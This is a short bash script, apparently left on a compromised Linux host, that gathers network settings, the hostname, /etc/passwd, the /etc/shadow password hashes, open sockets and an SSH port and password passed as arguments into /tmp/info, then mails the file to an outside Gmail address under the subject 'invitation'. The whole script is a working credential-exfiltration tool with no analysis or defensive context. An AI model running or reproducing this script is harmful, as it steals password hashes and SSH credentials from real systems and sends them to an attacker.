#!/bin/bash
/sbin/ifconfig > /tmp/info
echo '==='>>/tmp/info
hostname -f >> /tmp/info
echo '==='>>/tmp/info
cat /etc/passwd >>/tmp/info
echo '==='>>/tmp/info
cat /etc/shadow >>/tmp/info
echo '==='>>/tmp/info
ping -c 5 www.yahoo.com >>/tmp/info
echo '==='>>/tmp/info
echo 'Port si parola de ssh'>>/tmp/info
echo '$1:$2:' >>/tmp/info
echo '==='>>/tmp/info
socklist >>/tmp/info >/dev/null 2>&1
echo '==='>>/tmp/info
cat /tmp/info | mail puidedrac@gmail.com -s 'invitation'

